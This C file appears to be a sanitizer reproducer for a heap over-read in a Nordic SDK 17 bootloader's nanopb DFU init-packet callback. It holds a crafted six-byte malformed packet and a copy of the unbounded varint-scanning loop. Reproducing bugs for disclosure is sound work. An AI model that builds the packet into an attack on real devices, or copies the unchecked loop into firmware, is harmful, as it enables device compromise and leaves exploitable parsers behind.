/*
 * Host-side sanitizer reproducer for the R1 bootloader's nanopb init-field
 * decoding callback. This uses the exact SDK 17 generated schema and decoder.
 * It does not communicate with hardware or generate a DFU package.
 *
 * The six-byte packet is a bounded outer command whose nested init-message
 * length varint ends with a continuation byte. Nordic's callback scans that
 * varint directly without checking stream->bytes_left. AddressSanitizer should
 * therefore report a one-byte heap-buffer-overflow read in decoding_callback.
 */

#include <stdbool.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>

#include "dfu-cc.pb.h"
#include "pb_common.h"
#include "pb_decode.h"

static uint8_t *init_packet_data_ptr;
static uint32_t init_packet_data_len;
static bool init_packet_valid;

static void decoding_callback(pb_istream_t *stream,
                              uint32_t tag,
                              pb_wire_type_t wire_type,
                              void *iter)
{
    pb_field_iter_t *field = (pb_field_iter_t *)iter;
    (void)tag;
    (void)wire_type;

    if (field->pos->ptr == &dfu_init_command_fields[0])
    {
        uint8_t *ptr = (uint8_t *)stream->state;
        uint32_t size = (uint32_t)stream->bytes_left;

        if (init_packet_data_ptr != NULL || init_packet_data_len != 0)
        {
            init_packet_valid = false;
            return;
        }

        /* Exact production loop: no size/bytes_left check. */
        while (*ptr & 0x80)
        {
            ptr++;
            size--;
        }
        ptr++;
        size--;

        init_packet_data_ptr = ptr;
        init_packet_data_len = size;
        init_packet_valid = true;
    }
}

int main(void)
{
    static const uint8_t malformed[] = {
        0x0a, 0x04,       /* packet.command, four bytes */
        0x08, 0x01,       /* command.op_code = INIT */
        0x12, 0x80,       /* command.init, unterminated length varint */
    };
    uint8_t *input = (uint8_t *)malloc(sizeof(malformed));
    dfu_packet_t packet = DFU_PACKET_INIT_DEFAULT;
    pb_istream_t stream;
    bool decoded;

    if (input == NULL)
    {
        return 2;
    }
    memcpy(input, malformed, sizeof(malformed));

    stream = pb_istream_from_buffer(input, sizeof(malformed));
    stream.decoding_callback = decoding_callback;
    decoded = pb_decode(&stream, dfu_packet_fields, &packet);

    free(input);
    return decoded ? 0 : 1;
}
